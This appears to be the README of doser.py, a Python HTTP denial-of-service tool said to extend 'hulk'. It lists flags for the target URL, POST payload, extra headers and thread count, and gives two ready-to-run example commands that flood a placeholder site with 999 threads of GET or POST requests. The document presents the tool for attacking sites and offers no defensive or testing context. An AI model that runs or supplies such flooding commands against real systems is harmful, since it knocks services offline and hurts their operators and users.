# doser.py
DoS tool for HTTP requests (extended by hulk but has more functionalities) written in Python

# Usage
usage: doser.py [-h] [-g G] [-p P] [-d D] [-ah AH] [-t T]

optional arguments:

  -h, --help  show this help message and exit
  
  -g        Specify GET request. Usage: -g '< url >'
  
  -p        Specify POST request. Usage: -p '< url >'
  
  -d        Specify data payload for POST request
  
  -ah      Specify addtional header
  
  -t        Specify number of threads to be used

# Examples
999 threads sends POST requests with json data:

```bash
python doser.py -t 999 -p 'https://targeted.site.com' -ah 'Content-Type: application/json' -d '{"json": "payload"}'
```

999 threads sends GET requests:

```bash
python doser.py -t 999 -g 'https://targeted.site.com'
```
